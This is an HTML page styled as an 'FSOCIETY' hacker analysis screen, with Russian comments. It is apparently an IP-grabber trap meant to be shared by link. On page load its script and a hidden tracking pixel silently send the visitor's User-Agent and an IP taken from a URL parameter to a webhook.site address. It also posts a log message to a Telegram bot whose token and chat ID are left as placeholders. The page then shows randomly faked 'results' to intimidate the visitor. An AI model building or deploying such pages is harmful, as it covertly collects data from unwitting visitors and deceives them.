<!DOCTYPE html>
<html>
<head>
    <title>FSOCIETY - Результаты Анализа</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Пиксель для отслеживания IP (повторно, для надежности) -->
    <img src='https://webhook.site/a9b4438d-54be-4c82-a05b-caeea140149e' width='1' height='1' style='display:none'>
    
    <script>
        // --- КОНФИГУРАЦИЯ ---
        // !!! ЗАМЕНИТЕ НА СВОИ ДАННЫЕ !!!
        const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // Получается у @BotFather
        const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";   // Получается у @userinfobot
        const WEBHOOK_URL = "https://webhook.site/a9b4438d-54be-4c82-a05b-caeea140149e"; // Твой Webhook.site URL
        
        // --- ФУНКЦИИ ---
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Получаем данные о посетителе
        // ВНИМАНИЕ: Эти данные имитированы для отображения на странице.
        // Реальные данные (IP, UserAgent) отправляются на Webhook.site и в Telegram.
        const mockData = {
            ipAddress: "192.168.1." + Math.floor(Math.random() * 255), // Имитация IP
            country: ["USA", "Russia", "Germany", "Japan", "Unknown"][Math.floor(Math.random() * 5)],
            city: ["New York", "Moscow", "Berlin", "Tokyo", "London"][Math.floor(Math.random() * 5)],
            isp: ["ISP_ROUTER", "HOME_NET", "MOBILE_PROVIDER", "Proxy_Provider"][Math.floor(Math.random() * 4)],
            userAgent: ["Windows NT 10.0", "Macintosh", "X11; Linux x86_64", "iPhone", "Android"][Math.floor(Math.random() * 5)],
            timestamp: new Date().toISOString().split('T')[0] + " " + new Date().toTimeString().split(' ')[0]
        };

        // Функция для отправки данных в Telegram
        async function sendToTelegram(dataToSend) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const message = `--- FSOCIETY LOG DETECTED ---
IP: ${dataToSend.ipAddress} (${dataToSend.country}, ${dataToSend.city})
Provider: ${dataToSend.isp}
User-Agent: ${dataToSend.userAgent}
Timestamp: ${dataToSend.timestamp}
Detected via: ${window.location.host}
-----------------------------`;
            try {
                // Используем fetch для отправки POST запроса
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
                });
            } catch (error) {
                console.error("Ошибка отправки в Telegram:", error);
            }
        }

        // Отправляем данные в Webhook.site (для твоей панели)
        // Используем реальный IP, если он был передан как параметр (например, от сокращателя)
        const realIp = getParameterByName('id') || mockData.ipAddress; 
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                ipAddress: realIp,
                userAgent: navigator.userAgent, // Реальный User-Agent браузера
                timestamp: new Date().toISOString(),
                mockData: mockData // Отправляем и имитированные данные
            })
        }).catch(error => console.error('Webhook.site error:', error));

        // Отправляем данные в Telegram
        sendToTelegram(mockData);

        // Отображаем "результаты" на странице
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('ip-address').innerText = mockData.ipAddress;
            document.getElementById('country').innerText = `${mockData.country}, ${mockData.city}`;
            document.getElementById('provider').innerText = mockData.isp;
            document.getElementById('user-agent').innerText = mockData.userAgent;
            document.getElementById('timestamp').innerText = mockData.timestamp;
            document.getElementById('detected-source').innerText = window.location.host;
        });
    </script>
    <style>
        body { 
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
                        padding: 20px; /* Добавляем отступы для контента */
            box-sizing: border-box; /* Учитываем padding в высоте */
            overflow-y: auto; /* Разрешаем вертикальную прокрутку, если контента много */
        }
        .container {
            border: 1px solid #00ff00;
            padding: 25px;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0,255,0,0.6);
            background-color: rgba(0, 20, 0, 0.4);
            width: 90%; /* Ширина контейнера */
            max-width: 700px; /* Максимальная ширина */
            margin-bottom: 20px; /* Отступ снизу */
            text-align: left; /* Текст внутри контейнера по левому краю */
        }
        .header-text {
            font-size: 1.8em;
            letter-spacing: 3px;
            text-shadow: 0 0 8px #00ff00;
            margin-bottom: 30px;
            border-bottom: 1px solid #00ff00; /* Линия под заголовком */
            padding-bottom: 10px;
        }
        .result-line {
            margin-bottom: 15px;
            font-size: 0.95em;
            padding-left: 5px;
            word-wrap: break-word; /* Перенос длинных слов */
        }
        .result-label {
            color: #00cc00; /* Темно-зеленый для меток */
            margin-right: 10px;
            min-width: 150px; /* Фиксированная ширина для меток */
            display: inline-block;
        }
        .result-value {
            color: #ffffff; /* Белый для значений */
        }
        .footer-note {
        font-size: 0.8em;
            color: rgba(0, 255, 0, 0.7); /* Полупрозрачный зеленый */
            margin-top: 30px;
            text-shadow: none;
        }
        /* Стили для мобильных устройств */
        @media (max-width: 600px) {
            body { font-size: 1em; }
            .container { padding: 15px; width: 95%; }
            .result-line { font-size: 0.9em; margin-bottom: 12px; }
            .result-label { min-width: 120px; }
            .header-text { font-size: 1.5em; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-text">[ FSOCIETY DATA ANALYSIS ]</div>
        
        <div class="result-line">
            <span class="result-label">STATUS:</span> <span class="result-value">ACTIVE</span>
        </div>
        <div class="result-line">
            <span class="result-label">IP ADDRESS:</span> <span class="result-value" id="ip-address">---</span>
        </div>
        <div class="result-line">
            <span class="result-label">LOCATION:</span> <span class="result-value" id="country">---</span>
        </div>
        <div class="result-line">
            <span class="result-label">CONNECTION TYPE:</span> <span class="result-value" id="provider">---</span>
        </div>
        <div class="result-line">
            <span class="result-label">USER AGENT:</span> <span class="result-value" id="user-agent">---</span>
        </div>
        <div class="result-line">
            <span class="result-label">SYSTEM TIME:</span> <span class="result-value" id="timestamp">---</span>
        </div>
         <div class="result-line">
            <span class="result-label">DETECTED VIA:</span> <span class="result-value" id="detected-source">---</span>
        </div>

        <div class="footer-note">
            <p>[ ОЖИДАНИЕ СИНХРОНИЗАЦИИ ДАННЫХ... ]</p>
            <p>[ ВНИМАНИЕ: ЛЮБОЕ НЕАВТОРИЗОВАННОЕ ПОДКЛЮЧЕНИЕ ОТСЛЕЖИВАЕТСЯ ]</p>
        </div>
    </div>
</body>
</html>